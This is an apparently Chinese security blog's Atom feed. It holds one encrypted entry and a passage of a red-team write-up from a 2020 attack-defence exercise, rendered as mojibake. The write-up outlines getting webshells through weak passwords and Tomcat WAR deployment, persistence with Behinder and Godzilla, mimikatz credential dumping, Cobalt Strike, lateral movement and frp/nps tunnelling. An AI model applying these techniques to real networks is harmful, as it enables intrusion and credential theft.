<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M0nk3yâ€˜s Blog</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2020-12-03T03:29:34.962Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Recent arrangements</title>
    <link href="https://hack-for.fun/2986.html"/>
    <id>https://hack-for.fun/2986.html</id>
    <published>2099-11-01T04:00:00.000Z</published>
    <updated>2020-12-03T03:29:34.962Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç ." /><label>æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç .</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="5213892ac524e8a569545bc52ba4f61bde8c29b16a818fef6f3b2768318a2cef">14d6803ddc5375961808e6f50da8dbaa6183860c17230bf34a830cac112866558c2e19c5885cb2b7dce6498c85ac404bb76757cffdc3c8969b18340558d02eb4b75dd5259d359f23604e0fbdc5367b1a11dc1b5634f519e39d1b8d55f2c322e97c3ed56beadd8c84990cecf4a2ac9d0b85525f9ce4b3297aced757c0551cf2b7239d017666e0b7373cae2149d58e7499c40e6cd4c5210d003d724568d22e39a923b9ff87eb465384792f4bbacb056fc6d2cf376bfc67b568b1a6585445a492338524e9a39a18dffb618e8b112744e414be2e059e11a8c0edb04cf52d8cc2f083a76142d351ea168b6b6c8c8fb8f201c796b93010bddc14c7c6daf874708a425eca56168189c248358130e5ebfe98da81cbb92b568d9e669f7feee8b9d2597e849fab4cac44f92a12a77b3e0f3c929deb8bb28816e13c900f107d64dec22505f1124ebd036f1a6e93b632fc3b9d435c3da6f2d20d3fd1a615f0814cd8bfb5a5d622244a3a4d1dc5e4d2e363455b170327ce39cc9e87171d2573d9c0472edcfb6c58af04f637668e04bfc4ab421ca1f282561b5d31b2bb29ea663d2864e91bf2516899eb33af25cfbd3aa9fee89d6c07d48ea7f94fd5b6238d0590fd1903dbd8eb39ce05c1ec86edfa7ffb5ca10e59553d882f1badb0f6a5ef88eda4a33d2eaf3a0c83cf69cb1c4d3f629ee26114aa9f453fb816517ddd0add1207238ad5fd968be5a0bda63bb54df76494789e7734a0bb08d4c5ce646ad413c348e29658629d12ec86ccf86694e1e049b8ba44f0ad844a1dbc68dde52ebb781e56a239421959e1d4d9a3cd238a7f220c5e55e308aa0293eaddc57404e08e3f7ef0e3ad88b20036a1e2143aaeda07d9fd9f9701849d6b58b7c1c52037b149e866d6909834365fd9220d7a28e8a596249011c5d9439ce5d567649265348a30fbac4cbac7572d1bd809efef403ac81f00b50f602e1d96185bdf800aeb79a1267f3fe002544caeb3dee3f4f57f48a76a4956dd9255e46adbab7c40909dafd259be818a8c5dcf66208a59461ba8993adeca1188e37f0101cabef1bd6bb507b45a1daf3424b6392aa248340c5a2ac79460e56e65869fe3bf9b4f67ba6a4b57c979dd8a80ae8cf2fb54467247470dbaa1949eed83149f4c5a12000533517f48cdd778306de1571330fcf6866e6cc4ad6fa7e9ef3c16e27e74801c3f8e4252614cf36b49e2ca8b2fc6d17c1935a2329d0944857ffb251d8313e57d4eeb22665e9791d945838e9ea6bd9b7d0f01503f5a8523ce02d6ef6f90901bb40ba11c20c1a7afb43074087ac83d358a935d8c640945c5639c80c68576050e1913be51a2ddd574ea9c51865346a3d94b16cfc20daf066d754e5ba181215a3cb861b803368ac6428549c9f92272538d46bda48d1e9ff8428942687068e074059d10309c9454c07f4f71141ee423978616df47eb3151bd3984d8bb944858dd532705f2d147cc6d31a3dec11ce21c4b9c9a305cc6284eab6dea3afb468d0b02e1fe5a0216eaaf7165b022b92a2ac85202a91891d3d00ead8fded21eeac1b84879e07312486d7fe9068eaa1cd41dcad573f95daee22349a4718d7c0c11dbe6ebf0f76ddcdf3ace8d2f1f0875b577b6408183d7ef5e7c8b290a00d092ba324765f2d7da7f59b5f4258ee616d00efedeee8f663e57e45d741b6fedc6a7d9169db2810fac91bf2cc6291da024b8213e78f6e274441ac2e0c05b81cc01741f4f50e6608059236c3974d6c4cc462eb969ff437a1f09588febdeaad9ad67cb7d026fe929bb49844ca5418e29fdb7f31d20d4d39444a2236b68755fbe88d87f4aa343c240b9dfe873e33e7ffcdf84db840d2f91f02e57a479d9e04a009ef0bb9367fb6c58a31dbb229ad2e9ccf1774278116a94929d38858993186410cd14511d16fa3c57921b147f73423a945cd03a1e69e1f8f2e76db71b5cca4cd2eb5c4a845c68d247c9bfa4322b89f435fe6a87b48b87f27fbc5d662104acea163b299258c31002964523b579f4a7d08d2dc9b0ffe2141b35b1bc36e89226bba1e4a97ca1994b18079c0786d5dff3e47d247d89f32d5264e5c1ea95b1e142b987f70b8baa2601807f2c8ece968ccd1edcdc5838fe2a55fe14ed61eef59377d8793e5472298cdf16985dcf3edccf8fde4fa58706ee54d74f75e67f0f519deb9099b5c9fb215dae3e37a2c99c1c7bb5d020c872dfd04e8cd7a8e06f9750c5bd3f75a1bedee7a15f2d60679b3563fbb289c23a2579e0f43aa4411bd03fbaa6895e7f6b48fc34fb25f0dc19b2a1020f94e6dfe78946cbcc15878a514e6dd248c8642bc6fbbb4bd820be1dd8ad2d714e79f989913dfdcd779df1e9ac96516268dc1bdcafb75e575618fd546c37dbaecc960c5ce431e507f11f23d38a36a6f0a7ce5533173a46dcc0b486eec1cf38a7b3c30d5890541072a8e0b9f2dc333508f015927beb36b42eac577228b6872801825091b443b73ccfea15cfa313128318f70c3e9ab666191833626def2d77e02097feaec8cd2828b63ead6f6faddcf0fb9e29cace834ed83ebccaf4a9d8081f3b5b8592362a38e012e53527e3455975e4ebaa4f47b805b786d4759cee15e5ad9f7a0887e3a723f95fd6c32a6c423d38cac576666aa1d630a44cbc0dbc9102097631afe70e6bbc56a0fe726a302ec028a69b0a62f2a5b3d6080b2ce00b3bb91e276b95d45851d24c330cb07e811e96fb3d79419328cdd39f419f7eaa2dbf5d24371f0dcf00f0733db7a1c705f01c9dc6d0522de950122fe87305bf8df943e908363ba1fa783931dc71b0cc3d9f87ad761f544588a000f2be04d9c37fef0e8212e3d45b80cb7e3b40e22f7aa5bb58e36a64e7f9ab7e5a67266406e57134d54c63eae7577af5fe0a413b4eec66f6bbdfce1e448e40fb417a2eda22b776de7b627aa482ac87f1b6b0c25c05f256bbc28ec91324613cfed430e00533ac271892216ae842d7c0a40cd4f5f03e8ee5d4e975614511356a8439e91815d6fd6543999bfa56321c21020996e740d846731ddbee8c020ea7995b49b9b01ebb7528ec0c10707adeb222352345ad207d527df7f7ce9e56c8fe4bcb56ce0728f154ff6a988e4edc51d21f330056dd243a2a27b149722568f0e83086bc42cfcdc800535b4d68e5b84a80d5d2a7960dda82eaa65b8b17918d77b006c513752b7ff5aea6f089cd1651baa7f9d2f0e4b2aa889d6b5f543dd5b90e0f4bb1c4e7f41127f5bbbb3f12fe306eec5e0aba262f5b746097bf9461b0f20952ebc1cf15591c4b97a1df1d8ed11aaa51acf646a571668528fcbba37e006eec74053cdcc4dc2f4b4276656d68a17924477d48b02f78deaf71b8977f9f4bed65c7a9e68370bc2d3e686b93a91788e6cf1962d0e3c09532a6c2a20212da16b5f3a355d40db77f9a8aac5a173281058989f77c1d46bfd072a85f861c1ddcf4737a3e13b025ef527972e00d8c253debde8a80497b5191ae8eb27af2be6e06cc98777f8703944c65e7c53324c205d08db1376a528e3170f0de4ee6be44010fd7d012cbad9c82ca928dd4cbb41791ca9f8a9afb4828be9b8dc08a6d8c309f97cda9688dafff1ee9f39d1a109125068a1ad4d2f02ed85e1d8e6c956e9ac1eb48d8080400a1e3dfc3cea751e788d65117cc9d589a543d1df626dd9d99f540fb2c3b4cd48107c4b23b4db82870073c6cb71e91e21b124adbe9d7563bd84d48443ac5ba5cefbcefccae0caed7030f2849618ff30ca1f998fd5cdcae2de4a8d0fd142258a75a7178cca7138495b0f91a481ccc7f7ac9a371d1c59329b4b21807b6ae41837c42d01b601bee55444a2d65f18e2687fd86daaed04a5fbebf15b90ce78e687134b79c4c229328528f87bd589c2c9a9f1e114628d2ed94302bc63f000c9f6ed2a2f3bd57d4af7c9a11289cb4b3960d6b6d953ef0ba6722ed462850ee7000890ac6c75baac0036472a3a777281cd06c87b5c05246c08843ae76b1205de911148a3aee8870ca5a2376eab49f7da1cd80b254dd7c947ea276cd90f895eb5423cfe48ee53ef083623d41608b5694c0f3e4096d79929b7652d3849c6bd5cb454e2b210d866e5d6e260383da1645dbcac75b370da2d7f8001324edc4cb9453e154f64c8c4bac4bd6779847d45e48419697a90591cef721b30f91a601b6ea194b687db6b7257c150b29a3645d5c1519146190b7b30a3799b93f85ff628fdc6d0efd1ed6e965227bd4fdb5f293925203ae1bd7033b5ebfc0b615b6d0fc892dedd046ebf6b6840cd9b5b5f40ce3c8577850fd8bcb17c4d9d614ce5414709f0af806d3927c31be0e76b28674ab5c2b459c8a36b31e7215b43986e4818dc7d3ab5cfabe1a27fc71910a8bc6b5ad5c284960fdc16394119583b54fb44c3286938a08a27828ba9289dfdd31a3eda61453f71b67e748618f7d1a85d2206df8dc015733fc2c17bad22f6fa60284013af80eb1ab733f0bc5b4e0e5d0794efa8e59d4726bb5943b978ce6e48526a3f4950ffc93128897414653c7119751e1ad670b7ca653afae68cf5ad1fcb0e76070de4c9f2a9b4b76e2faa4bbad4df413e66c42df6a4a16e10409f61eac52adc06db901d35cfa1805ea2ddf9f6c22abc6d3de63fa3ab2ca778d3a8880b9305a1c59d8906d4a8364c29bdecde241d2608b009412f7e66846253c683a81e7bfc230d37e90a62a5b1c70c6cc032cc394114c0b853ac2d04fa9fdf95a97fa92cc816483a5a97465e293da69c251bcad2a95b8ca3627b35f395bd8742f01a7287e9ce6d9f9714da75bf374dd1c6ef4b7ec0b4011787e5d17ebab635b1d0485c5b0dfe0745fe308936fe66d197a9e05bbdc87282ec0f2c78b3c94c28bde66f7c721c45149bd0121a251511b92bab08df8e7384506d147ec6992d7ce042d1b0995d505e4a9782ccaf3226da629ce44c404e06baf79d12bd2439b2296abd3740a41879c8cf4161cdd9029c336f5303212d37698fd98226727f6ee84a6fd87af74559da17452b48dd0616fe52c29a669eeb7fda5cf995df35ae6df84e60a9aa7431c9ad469a439d7d0b4e62ee57a2bafcda0efac0aac4d087dde4a901e50694a9cd64dadde3d8cdfe8727d3488488f2b8fc3cbedaf25e5930410240f654b8a0f7a1c11776f3da38bea66ca2699c46bcd90ecbf9aa40e385859dbae2fd88afb34504b4e8eed8d1faa85bdf5dc8bd284460db8081d9d5f0d202a4eb89c76fda2f1526a2ae11756a1148b1cf7f0eeadbd8ade71da061aec2a22ff365be98e023f6a1bd3d59086a0d405bacc8057e768a08575ab8508291c3893625ab267ac9becea928b9f686700cd184c777f4e961747fab1d8a04889f70783ac4e2a301d3d5069334b7af93dbc5e5936c4785464ca4a0366a296822417712ff6af68edde4268289d7a17cde9e651c5347b219e4d0eb021e55a39049a90a7fe4608d639888b16f18205ec9d13c84280c7adfab6069c76c85abee586f7a9597852e5b85ecea29f9f774e055681c8b3a7430f469c7eb651b71b6da68380668180df846a5736aadad4720b2c9972c5a50dccc2f4823b830a7eade4f1c480c22cba2bdd5015535b8dc2a033382ee215587d040c62a4cdcc97bae0f09a7fd8bae80cd7b542b17740f24ee25876a30c121721f5dbc4cd5beb16abeb4a2a20b25a3e34af81485d3921aa740d021b6ad27dff11a9888820fc4ef8726855389938d3cd6b31cea99777d0b12811dc72ed1b08c8cacb325d2de89ea3e10e10f303a646e6184c59490c972589e033bfd6e72dda1559c839dea4cd12a4ad8a9f0e2d3b180f6c8c57dcd9ae9539f2fb510012ad552d4eedb942407387ee7b51b5ba95b79456f5005d83db750003b729641327995fc38b82b34962608597392c36eccf41cf419a8624c38b01213741526d81317876093a10ae8c7830f5715b38128b332e653360b5fcd3fcedfff283cf9fae0e367ac407368ce07e6895cae290a1732e2bc77e484e3e3f6eb1bab9b17110994decf569d62c0071e4bfd0f9af5900d51fcff91d5f98a6296052baf339a437879793f58463496d88d9e63afd1474f305ccf9b93e30913a36ac01745bab143cdfcb5d1df93e9b9fa81f0f72a13b28f0b7d53f23c030a625be2ae3e5ffdb82bdc88d009418bebb06c22be3c8d4a3c01a8cf3424007de79460ff6ee7e6c75d408333c5094bb1834a8771106249d477ffba6de96b7544861f12f2d9a91ae9a84d36a5a3f2258c8971734acf0f3802bbbe3552b86c593b06f9a84be69f13536ba1e23016e9f064b488ad80130d9df95933d427225a82cbc6bffbaccd512971bc9a2071c9c8c22d9963bbe3a14b53dddba15f2668bd0b18bccb4b543b3715df4ccd6a296cd455e2aa9007ca9501885ef94994db413568489db92034267a7f05f9f75590abd462f713b4e19aadd6861b783d8aa2c029d1b9ec55ef0fd870f23e9daf3f9da628fd13d0adf56e218d8ae9c87fd4ca642394640bbf5570d091d7dcce843276ec74946e66adfc2c326ab0862adf81838269531c43a59945257404921472bb77af71b3412c00307174efa76d42433239fa5c3684bbf5c3458f646a5d6774b78a9af183d327e9d0b340f1953180bb3b2ea5e34d3a5c345c4b1579ef7be861e3378eca5e2863dd1ccaf5f3aa98b143a54626002a36df07af67da4b4d29cf49aa85074643d33956d444685578f5b8a38c3362760100b212e594fb6808b2a4992eaa8037f10fec6588c463dabf23d0ddd2b67013049df4b1f1e9fc3b99dda54c9c0d5c43b10442512db83c06586db2d26eb46ab04a43ee758befa4e6f2e8aa0e5a418d636a373977235108e5093a1498b9c36a07de34cfcfb3f1b0db83fd58338be4db7966deaf1f6c7d2e83b32c976dd570732b637634c2eacb1a501c7aea19b3fd1260d2daa7e13400a2a7b36a67d90980dca7285edb6423b9d39a5e71e35c45a4a3406b3f566a231c75fa1eedd28cc254fd31532c5915c1ab286f3a015625f070384f076827f989d99d7671398fd524183f8d09d2e507d44dfa08d24781ba2d541c25bb4bb4ebc83eab95164c813aea96857e3fb4eedd607e8b43e7986162dc2710aec9eddcb0661132af9f34e69fc88a8585628e396b517ba0c131867344a42db313643759d1ea267cb0c5b4e511cc7d80a9c41198f75a3b0bcffb3a4e63b2c78fa6a75c1a349978b676537383567dea44b22400111a80df160c8bf4d2cb753b720dc027311ffbf8b4194eeff0518d9bfe550fe3380f0b4c09a2062c1bfbeea775da3282d14b154e4bec8ce11f4aabcfa621ff64522c71884d2d7d2f97465ec07eed4d8321b47129f87f3a704e1fef2a7b3694072cecb97992b0f239a8b1a67769036fcd4ba5244519673da54b962257e951f267f80883df80cfd9e5613bdb988cdd4cb94ba69442f1df7706159015f469c02a3557b70ee716c458e71998727c9d89645ccdcf14bd6f3cdb174b2b4d2f42c7df608f3a72338e1c1e7f53065596d0d999f06f1839891c8b310cb42c91246d5e5a67b4bacd29f3f4b5180e7ab34a4a45c87d1cfc2f75675748f9ba8df9d0ed835985463eae6a77fbe36eb4c60a4c68bf922bbb2e26fabdbea5aa3e37d6d2a453744735f9ed6034a6a0f5b20d5089689d7364fe676a4f66e04a176213a63d7a30d876a1a59150260716dfe19824ad41e4803ee7a1183cb77a065ceed3b9c5c8af584fa2e94dfba8b562ba8bcb8583d39e062a2f79a9c5852323cb00563ee8622ec882622803f40739506c2ce580bd5d4a758a13172c447c4a432eb4d4b3595d948c4100742ca4b6bb16d1f251988dd756f4f0ce5d733e42f176b500fcccc0c491d12048104ced2c51d716aca880efc8326d80ee036202d3dcdb2da4f758f78331d2a1d8788109238a76090a5f146f74e66d0b499b1c4ffa824a3bfea9b449ac9d05da54096ab8b0be0a9639418598587f4a73b82a591a7b24dba31eff129b84ea936fe125f60777fe75bb83f93f0a6559c97b182bc3027acfb1b2e371e418ac35f3c540cb3f6f9cccd37f6e8e8d65ad954df3ecf739fa6f15187ca726fecb7a36718f86a9c3c442dc63e63b8f655b77c54909421e9d097de70ae94b5a50a4dbebd2be97b69a2243188335ca4567736bdee2581e0e886c880b396ff0a74a788e04d16bee2874aee1a2197e03cd6712d0e48f1c36e6cdc39e0a9d23f9a7193f0512dd4b6e0c1ef81698512d4cc0d4867e95329df761e28f9eacb8012ec29220181a6b088adfed164ec148b09377fff7dab3a413f67381e7356e7840e6a9b88fec797ee7b11abdc68ef52f1ef0f4d191fd194ad1bc72da2329fdbd4e5d9f545950dd9ba0b625fe1ecde4416a63667fc04b2f4d0a2b0211b8ab9e993703fb03bcb92ebe0a159371147cff6953b6419449377a469687468bd2fe4f62c1fb3fe5ce9146939f73d51dd7a82ef3db8dec5e501844f2fa9d94b70526feedf75af2cec5e81cdccbf2888273e123ce861e974281137c43400b0f02bf8139fb2ecb6d127d46c388f9d7cd5e89aa70be4888e4bf24ae3a3bf3ff3dbcc5a81df417fc8a989d95d5a891dda680ac1cd584cfa4d738605514e3dcfb86a51f31e1e3b1c0801b768daf78a2a04403b4d6744d33889ab28cf3130afbe78083e0ff9efc0bb26ce452af1c47a6225795ad8b52a839564c1208d8853cf0a718fbeb8da3b2a19ffd7798c6756f8a0dc29d461fed7ea27abfdcc8b040882142d3a1757c38536ccd7b7f29dec64d2957c9fa5b0dd6847a72beef0b46aa307cacdf76592deda17fcb8d2bfe358207171b71553dda3be9b572d054a318f812a2714ea2020320675a97e860ed913146719232a8820b90a96381e25bdf3438d55f2467b7d718b9e7c06f45b9472a73c1c74f7c40c140db4901e22e43c90ebee1f2f8172b29cdff9da8b18de60a40e017f9422713f709eb6698e0c3b45baaa7636a6e44e97166e76f5e2f8308f771e16e5d41329ade1bb6fe628f9060999adb7ab26777a89dcba0b0523ca26b5a7e5ae76739b9701272b89fd432233f30e71e65979f4d8158f8823973ef3669a7c4320265c680689bbacf3dc23a3e8224cc579c926574d3155edbf0b394dc8bb1c002e52cde45df4cf6268a87b98ac0f81c88b3ff69fc6f3e91e169f60490071485d1653d8dbb9767bd367b17c84ec3ebce82f6783c1ba892d8cdcc7c05824ed82c6831c0bd576bd19e3e6d764867b6a48ca4079267b9005fb96e8dad718e3765816a287a1d5442c178009e4e51b861bab6dc9009d1e999735a5871dd2ebe053ebe94e2c60df61416b86471f5c2d75b8e523803107a0f1669cad66a7fabe23adcb669b76edc8f1e6bacdc5a05df4fd087303c015308da5732e145f7704b002fccb522bd996c093be96e7f106dea7bc2491b294c579c9b0b9e7149d05fa0a31359982b1ce651ce08e6613cf5ffa1c0d03c9f1a952bf382f394ff7cf287286c44f865f70a656f8469e3ea67894f0959b0103931a57c42b7ffc6ffb9083962363fc3b30940e3992a85d029aa628ba5db6a5e71248657b6c4ec0b4224aebcd1d4a341827c8e3bd21c6f3b225bed84445a60a63f57cab8c28c9341c39804cd55d5e92460c16bd3efd62667d014ca89601f784cbcfec59e0c236f91028f013cfed4015114fa86a07e542acc28f8a7d657cbe76579bdaca0e96fb5968fea451d9a20bd98a254f316e47ef22ced6eb12ec75ab6c4f6ac2e5dd2c8a6635</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">æœ‰ä¸œè¥¿è¢«åŠ å¯†äº†, è¯·è¾“å…¥å¯†ç æŸ¥çœ‹.</summary>
    
    
    
    
    <category term="æ‚ç¢" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>æŸå¸‚HW2020å¿ƒå¾—æ€»ç»“</title>
    <link href="https://hack-for.fun/6988.html"/>
    <id>https://hack-for.fun/6988.html</id>
    <published>2020-12-04T16:31:53.000Z</published>
    <updated>2020-12-04T17:34:18.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="è¯´åœ¨å‰é¢"><a href="#è¯´åœ¨å‰é¢" class="headerlink" title="è¯´åœ¨å‰é¢"></a>è¯´åœ¨å‰é¢</h1><blockquote><p>é¦–å…ˆï¼Œèœé¸¡é“æ­‰ï¼ŒDBQå¦ä¸€ä½å¤§å¸ˆå‚…ï¼æˆ‘å¤ªèœäº†ï¼Œæ²¡èƒ½æ‹¿åˆ°ç¬¬ä¸€ã€‚æœ€ç»ˆæ‹¿äº†ç¬¬ä¸‰ï¼ŒäºŒç­‰å¥–ï¼Œæœ¬åœ°å‚å•†ç¬¬ä¸€ã€‚</p></blockquote><p>è¿™æ¬¡å…¬é¸¡é˜Ÿæ¯”è¾ƒå°‘ï¼Œ7æ”¯é˜Ÿä¼ï¼Œ4æ”¯æœ¬åœ°å‚å•†ï¼Œ3æ”¯å¤§å‚ã€‚å¤§å‚æ˜¯<strong>å¥‡å®‰ä¿¡ã€å¤©èä¿¡ã€å®‰æ’ã€‚</strong></p><p>è¯¥å¸‚å‚æ¼”å•ä½è¦†ç›–äº†åª’ä½“ã€å­¦æ ¡ã€åŒ»é™¢ã€èƒ½æºã€äº¤é€šã€é“¶è¡Œ(é‡‘è)ã€æ”¿åºœç³»ç»Ÿã€‚ä½†æ˜¯äº’è”ç½‘åŒºçš„èµ„äº§ç›¸å¯¹è¾ƒå°‘ï¼Œç”šè‡³æœ‰çš„ç›®æ ‡ç›´æ¥ç»™çš„æ˜¯å†…ç½‘é¶æ ‡ã€‚</p><p>è¿™æ˜¯æ­¤æ¬¡æ”»é˜²çš„èƒŒæ™¯ä»‹ç»å§ã€‚</p><h1 id="çº¢é˜Ÿè§†è§’ä¸‹çš„æ”»é˜²æ¼”ç»ƒ"><a href="#çº¢é˜Ÿè§†è§’ä¸‹çš„æ”»é˜²æ¼”ç»ƒ" class="headerlink" title="çº¢é˜Ÿè§†è§’ä¸‹çš„æ”»é˜²æ¼”ç»ƒ"></a>çº¢é˜Ÿè§†è§’ä¸‹çš„æ”»é˜²æ¼”ç»ƒ</h1><p>æ”»é˜²æ¼”ç»ƒä¹‹å‰å‚åŠ è¿‡ï¼Œå›½å®¶çº§ã€çœçº§éƒ½å‚åŠ è¿‡ï¼Œåªä¸è¿‡æ˜¯è“é˜Ÿï¼Œåšé˜²å®ˆçš„ã€‚</p><p>è“é˜Ÿçš„è¯ï¼Œå‰æœŸçš„æ”»å‡»é¢åˆ†æã€èµ„äº§è¡¨æ•´ç†æ¯”è¾ƒéº»çƒ¦ã€‚è¿˜æœ‰æ­£å¼è¡ŒåŠ¨å‰çš„æ¨¡æ‹Ÿå¯¹æŠ—ä¹Ÿæ˜¯è“é˜Ÿåšçš„ã€‚ç­‰æ­£å¼å¼€å§‹åï¼Œä¸»è¦æ˜¯å°±æ˜¯å®‰å…¨è®¾å¤‡çš„ç›‘æ§ã€ç­–ç•¥åˆ†å‘ã€åº”æ€¥å“åº”ã€å…¬é¸¡è€…æº¯æºã€‚</p><p>çº¢é˜Ÿçš„è¯ï¼Œè¿™æ¬¡ç®—ç¬¬ä¸€æ¬¡å®åœ°ä½œæˆ˜ï¼Œä¹‹å‰è¿œç¨‹æ”¯æ´è¿‡æŸç›´è¾–å¸‚çš„æ¼”ç»ƒï¼Œä½“éªŒä¸æ˜¯å¾ˆæ˜æ˜¾ã€‚</p><p>æˆ‘è®¤ä¸ºï¼Œæ”»é˜²ä¸­çº¢é˜Ÿçš„ç›®çš„éå¸¸æ˜ç¡®ï¼š</p><ul><li>æƒé™</li><li>æƒé™</li><li>æƒé™</li></ul><p>å¯¹ï¼Œæ²¡æœ‰é”™ï¼Œå°±æ˜¯shellã€æƒé™ï¼ˆWebåº”ç”¨ç®¡ç†å‘˜ã€è¶…çº§ç®¡ç†å‘˜ã€ç³»ç»Ÿç®¡ç†å‘˜æƒé™ã€ä¸»æœºæƒé™ã€æ•°æ®åº“æƒé™ã€è·¯ç”±å™¨ã€é˜²ç«å¢™ç­‰è®¾å¤‡æƒé™ï¼‰ã€‚</p><p>ä¹‹å‰ï¼Œä¹Ÿè¯´</p><ul><li>æ•°æ®</li><li>æ•°æ®</li><li>æ•°æ®</li></ul><p>å¯¹ï¼Œä¹Ÿæ²¡æœ‰é”™ï¼Œä½†æ˜¯è¦è·å–å¤§é‡æ•°æ®ï¼Œä¸»è¦æ˜¯å¤§é‡ï¼Œè‡³å°‘ä¹Ÿå¾—å‡ ä¸‡å‡ åä¸‡é‚£ç§å§ã€‚ä¸æ‰“åˆ°å†…ç½‘æ ¸å¿ƒåŒºï¼Œè‚¯å®šæ˜¯æ‹¿ä¸åˆ°çš„ã€‚é™¤éDMZåŒºçš„æ•°æ®åº“ å°±å¾ˆå¤§ï¼Œå¹¶ä¸”éƒ½æ˜¯ä¸€äº›é‡è¦çš„æ•°æ®ã€‚</p><p>å¹¶ä¸”ï¼Œè·å–WebShellï¼Œæ‰æ˜¯å¼€å§‹ã€‚ä¹Ÿå°±æ˜¯å…¥å£æƒé™ã€‚</p><ul><li>æŸç³»ç»Ÿå¼±å£ä»¤åå°ä¿®æ”¹æ¨¡æ¿GetShell-&gt;å†…ç½‘æ¼«æ¸¸</li><li>æŸç³»ç»Ÿç›®æ ‡åŒIPå…¶ä»–ç«¯å£æ˜¯Tomcatã€å¼±å£ä»¤+éƒ¨ç½²WARåŒ…GetShellï¼ŒåŒç½‘å¡ï¼Œ192æ®µå’Œ172æ®µã€192æ®µå‡ºç½‘-&gt;å†…ç½‘æ¼«æ¸¸</li></ul><p>å› ä¸ºæ˜¯çº¢é˜Ÿï¼Œä¸åŒäºå¸¸è§„çš„å®‰æœã€æ¸—é€ã€‚æ˜¯è‚¯å®šè¦æ‰“å†…ç½‘çš„ã€‚æ‰€ä»¥è¿™æ—¶å€™èƒ½æ‹¿ä¸‹ä¸€å°è¾¹ç•Œä¸»æœºï¼Œå­˜åœ¨åŒç½‘å¡æœºå™¨çš„æˆ–è€…å­˜åœ¨å†…ç½‘ipçš„æœºå™¨æƒé™ï¼Œå°±å¯ä»¥ä¸Šå†°èï¼Œå†°èä¸»è¦æ˜¯åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†ï¼Œå¯ä»¥ç»•è¿‡ä¸€äº›å®‰å…¨è®¾å¤‡çš„æ£€æµ‹ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å“¥æ–¯æ‹‰ã€‚åšæƒé™ç»´æŒï¼Œè¿™é‡Œä¸€å®šè¦æ‹¿åˆ°å…¥å£æƒé™ååšæƒé™ç»´æŒï¼Œå› ä¸ºä¸€å¼€å§‹æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªwebshellä¹‹åï¼Œè¢«å¦ä¸€ä¸ªå…¬é¸¡é˜Ÿç»™åˆ äº†ã€‚</p><p>æƒé™ç»´æŒåšå¥½åï¼Œè¦ä¹ˆå¼¹shellåˆ°MSFä¸Šï¼Œè¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼ŒmimikatazæŠ“å¯†ç ï¼Œæˆ–è€…å“ˆå¸Œã€‚æˆ–è€…ç›´æ¥å¼„ä¸€ä¸ªä¸Šçº¿CSçš„ç®€å•å…æ€é©¬ï¼Œè¿™æ¬¡å¦ä¸€ä¸ªå¤§å¸ˆå‚…å°±æ˜¯åœ¨ä»–ä»¬å›¢é˜Ÿè´Ÿè´£æå…æ€çš„ã€‚Orzã€‚ä¸Šçº¿CSåï¼Œä¹Ÿæ–¹ä¾¿ååŒä½œæˆ˜ï¼Œå¹¶ä¸”é«˜åº¦è‡ªå®šä¹‰çš„CSï¼Œæœ‰å¾ˆå¤šè‡ªåŠ¨åŒ–æ’ä»¶ï¼Œä¸€é”®ä¿¡æ¯æœé›†ï¼Œå½“ç„¶å‰ææ˜¯ç›®æ ‡æœºå™¨å®‰å…¨æ€§å¾ˆä½ï¼Œæ²¡æœ‰è£…å¤ªå¤šæ€è½¯ï¼Œè¦ä¹ˆå°±ç»•ã€‚</p><p>æ¨ªå‘ä¼šé‡åˆ°éš”ç¦»é—®é¢˜</p><ul><li>é€»è¾‘éš”ç¦»</li><li>ç‰©ç†éš”ç¦»</li><li>å¼ºåˆ¶ç‰©ç†éš”ç¦»ï¼ˆæœ‰å¾…ç ”ç©¶æ˜¯å¦å’Œç‰©ç†éš”ç¦»æœ‰åŒºåˆ«ï¼Œè®°ä¸æ¸…äº†ï¼‰</li></ul><p>è¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å¬è¿™ä¸ªæœ¯è¯­ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ç½‘ç»œä¸äº’é€šï¼Œè¦é€šè¿‡è·³æ¿æœºæµé‡ä¸€å°ä¸€å°è·³ã€‚ä¹‹åå¬å¥‡å®‰ä¿¡çš„ä¸€ä¸ªå¸ˆå‚…è¯´ï¼Œæœ‰ä¸€å°æœºå™¨ä»–è·³äº†å¾ˆå¤šå°ï¼Œæœ€åæŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶éƒ½è¦èŠ±ä¸€åˆ†é’Ÿã€‚npã€‚</p><p>è¯´é“è¿™é‡Œï¼Œå°±ä¸å¾—ä¸è¯´å†…ç½‘ç©¿é€çš„é—®é¢˜ã€‚</p><ul><li>frp</li><li>nps</li></ul><p>æµé‡è¿›çš„å»ï¼Œæ•°æ®å‡ºçš„æ¥ã€‚</p><p>æˆ‘è¿™æ¬¡åœ¨æŸç›®æ ‡ç¿»æ–‡ä»¶çš„æ—¶å€™ï¼Œåˆ 